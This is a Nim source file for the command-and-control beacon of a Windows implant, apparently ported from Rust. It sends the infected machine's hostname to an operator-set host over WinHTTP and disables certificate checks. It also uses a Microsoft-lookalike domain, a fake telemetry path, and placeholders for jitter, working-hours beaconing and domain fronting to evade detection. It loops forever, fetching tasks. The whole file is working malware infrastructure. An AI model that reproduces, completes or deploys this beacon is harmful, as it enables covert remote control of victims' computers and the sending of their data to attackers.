# c2.nim — HTTP/S beacon loop using WinHTTP
#
# Bug fix: original Rust defined `pub unsafe fn run()` but main.rs called
# `c2::beacon_loop(&SLEEP_KEY)`. Fixed: renamed to beaconLoop(key: array[16, byte]).

import winim
import winim/inc/winhttp

template dbg(msg: string) =
  stdout.writeLine("[c2] " & msg)
  stdout.flushFile()

const
  SLEEP_MS*:      uint32 = 30_000'u32
  C2_HOST*:       string = "update.microsoft-cdn.net"
  C2_PORT*:       uint16 = 443'u16
  C2_BEACON_PATH*: string = "/telemetry/v2/collect"
  TIMEOUT*:       uint32 = 10_000'u32

# Operator-patched at build time by builder.py
const
  NGROK_HOST*:          string = "NGROK_HOST_PLACEHOLDER"
  FRONT_DOMAIN*:        string = "FRONT_DOMAIN_PLACEHOLDER"
  BEACON_INTERVAL_MS*:  uint64 = 15_000'u64
  JITTER_PCT*:          uint64 = 30'u64
  BEACON_HOUR_START*:   uint32 = 8'u32
  BEACON_HOUR_END*:     uint32 = 20'u32
  DEAD_SLEEP_SECS*:     uint64 = 3600'u64

const
  WINHTTP_QUERY_FLAG_NUMBER = 0x20000000'u32

proc toWide(s: string): seq[uint16] =
  result = newSeq[uint16](s.len + 1)
  for i, c in s:
    result[i] = uint16(c)
  result[s.len] = 0

proc getHostname(): string =
  # unsafe
  var buf: array[256, WCHAR]
  var size: DWORD = 256
  discard GetComputerNameW(addr buf[0], addr size)
  var s = newString(int(size))
  for i in 0 ..< int(size):
    s[i] = char(buf[i])
  s

proc buildBeacon(): seq[byte] =
  let host = getHostname()
  let msg  = "{\"host\":\"" & host & "\",\"tid\":0}"
  result   = cast[seq[byte]](msg)

proc winhttpRequest(body: seq[byte]): seq[byte] =
  # unsafe — raw WinHTTP calls
  dbg("beacon to " & NGROK_HOST & ":" & $C2_PORT & C2_BEACON_PATH)
  var ua      = toWide("Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
  var hostW   = toWide(NGROK_HOST)
  var pathW   = toWide(C2_BEACON_PATH)
  var verbW   = toWide("POST")
  var httpVer = toWide("HTTP/1.1")

  let session = WinHttpOpen(
    cast[LPCWSTR](addr ua[0]),
    WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
    nil, nil, 0)
  if session == nil:
    dbg("FAIL: WinHttpOpen returned nil")
    return @[]
  dbg("WinHttpOpen OK")

  var timeout: DWORD = DWORD(TIMEOUT)
  discard WinHttpSetOption(session, WINHTTP_OPTION_CONNECT_TIMEOUT,
                           addr timeout, 4)

  let conn = WinHttpConnect(session, cast[LPCWSTR](addr hostW[0]),
                            C2_PORT, 0)
  if conn == nil:
    dbg("FAIL: WinHttpConnect returned nil (host=" & NGROK_HOST & " port=" & $C2_PORT & ")")
    discard WinHttpCloseHandle(session)
    return @[]
  dbg("WinHttpConnect OK")

  let req = WinHttpOpenRequest(
    conn,
    cast[LPCWSTR](addr verbW[0]),
    cast[LPCWSTR](addr pathW[0]),
    cast[LPCWSTR](addr httpVer[0]),
    WINHTTP_NO_REFERER,
    nil,
    WINHTTP_FLAG_SECURE)
  if req == nil:
    dbg("FAIL: WinHttpOpenRequest returned nil")
    discard WinHttpCloseHandle(conn)
    discard WinHttpCloseHandle(session)
    return @[]
  dbg("WinHttpOpenRequest OK")

  # Ignore SSL cert errors (self-signed, CN mismatch)
  var secFlags = DWORD(0x00000100) or DWORD(0x00001000) or DWORD(0x00002000)
  discard WinHttpSetOption(req, DWORD(31), addr secFlags, DWORD(4))

  var ct    = toWide("Content-Type: application/json\r\n")
  let bptr  = if body.len > 0: cast[LPVOID](unsafeAddr body[0]) else: nil
  let ok    = WinHttpSendRequest(
    req,
    cast[LPCWSTR](addr ct[0]),
    DWORD(-1),
    bptr,
    DWORD(body.len),
    DWORD(body.len),
    0)
  if ok == 0:
    dbg("FAIL: WinHttpSendRequest failed (err=" & $GetLastError() & ")")
    discard WinHttpCloseHandle(req)
    discard WinHttpCloseHandle(conn)
    discard WinHttpCloseHandle(session)
    return @[]
  dbg("WinHttpSendRequest OK")

  discard WinHttpReceiveResponse(req, nil)

  var status: DWORD = 0
  var statusSz: DWORD = 4
  discard WinHttpQueryHeaders(
    req,
    DWORD(WINHTTP_QUERY_STATUS_CODE) or DWORD(WINHTTP_QUERY_FLAG_NUMBER),
    nil,
    addr status,
    addr statusSz,
    nil)
  dbg("HTTP response status: " & $int(status))

  var response: seq[byte]
  var buf: array[4096, byte]
  while true:
    var nRead: DWORD = 0
    let rd = WinHttpReadData(req, addr buf[0], DWORD(buf.len), addr nRead)
    if rd == 0 or nRead == 0: break
    for i in 0 ..< int(nRead):
      response.add(buf[i])

  discard WinHttpCloseHandle(req)
  discard WinHttpCloseHandle(conn)
  discard WinHttpCloseHandle(session)
  response

proc dispatchTask(task: seq[byte]) =
  discard task  # task dispatch handled by beacon loop

# Primary beacon loop — never returns.
# Fix: renamed from `run()` (no params) to `beaconLoop(key)` to match call site in main.
proc beaconLoop*(key: array[16, byte]) {.noReturn.} =
  while true:
    dbg("--- beacon cycle ---")
    let beacon = buildBeacon()
    if beacon.len > 0:
      let task = winhttpRequest(beacon)
      if task.len > 0:
        dispatchTask(task)
        dbg("task response: " & $task.len & " bytes")
      else:
        dbg("no task / empty response")
    else:
      dbg("FAIL: buildBeacon returned empty")
    dbg("sleeping " & $SLEEP_MS & "ms...")
    Sleep(DWORD(SLEEP_MS))
